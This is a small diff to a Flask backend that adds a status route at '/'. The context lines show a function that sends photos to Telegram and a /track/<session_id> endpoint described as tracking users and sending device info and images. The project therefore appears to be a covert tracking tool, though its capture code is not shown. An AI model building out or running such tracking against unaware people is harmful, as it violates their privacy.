@@ -40,6 +40,11 @@ def send_telegram_photo(photo_base64):
         print("Error sending image:", str(e))
         return False
 
+@app.route('/', methods=['GET'])
+def home():
+    return "Flask backend is running!", 200
+
+
 @app.route('/track/<session_id>', methods=['POST'])
 def track_device(session_id):
     """Track user and send both device info & image."""
